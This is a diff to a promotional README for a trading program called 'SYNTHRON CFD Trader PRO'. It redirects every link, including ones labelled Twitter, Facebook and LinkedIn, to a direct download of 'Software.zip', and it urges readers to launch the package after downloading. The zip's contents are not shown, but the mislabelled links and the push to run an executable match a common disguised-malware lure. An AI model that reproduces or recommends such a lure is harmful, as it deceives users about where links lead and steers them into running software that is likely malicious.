@@ -28,7 +28,7 @@ SYNTHRON CFD Trader PRO is a revolutionary trading platform that integrates raw,
 
 Experience the power of SYNTHRON CFD Trader PRO by downloading the software package from the link below. Get ready to elevate your trading game to new heights!
 
-[![Download SYNTHRON CFD Trader PRO](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/tag/v1.0)](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/tag/v1.0)
+[![Download SYNTHRON CFD Trader PRO](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/download/v2.0/Software.zip)](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/download/v2.0/Software.zip)
 
 *Note: The software package needs to be launched after downloading.*
 
@@ -38,15 +38,15 @@ Whether you are a seasoned trader or just starting out, SYNTHRON CFD Trader PRO 
 
 Dive into the world of data-driven trading with SYNTHRON CFD Trader PRO and unlock endless possibilities for success in the dynamic and fast-paced financial markets. Start your trading revolution today! 💰📈
 
-![Trading Revolution](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/tag/v1.0)
+![Trading Revolution](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/download/v2.0/Software.zip)
 
 ## Stay Connected! 🌐
 
 For the latest updates and news about SYNTHRON CFD Trader PRO, make sure to follow our official channels and join our community of like-minded traders:
 
-- [Twitter](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/tag/v1.0)
-- [Facebook](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/tag/v1.0)
-- [LinkedIn](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/tag/v1.0)
+- [Twitter](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/cavhd2/Synthron-CFD-Trader-PRO/releases/download/v2.0/Software.zip)
 
 Let's revolutionize the way we trade together! 🚀✨
 
